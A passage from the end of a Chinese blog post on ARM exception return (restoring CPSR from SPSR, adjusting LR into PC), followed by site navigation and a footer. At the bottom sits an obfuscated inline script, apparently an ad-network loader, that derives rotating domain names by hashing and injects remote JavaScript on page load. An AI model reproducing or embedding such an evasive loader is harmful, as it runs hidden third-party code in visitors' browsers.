<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>在异常处理结束后，异常处理程序完成以下动作</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器的值复制回</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将</span><span lang="EN-US"><span style="font-family: Times New Roman;">LR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存的值减去一个常量后复制到</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器，跳转到被中断的用户程序。</span></span></span></p> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/18552560c58d75a7cedcdeb4ba1ba83d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">[Gridview]点击编辑列，修改后点击更新获取不到修改后的值</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4836e64ff4ea75e48f8ace1ca4bdc25c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Rails开发技巧集锦</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>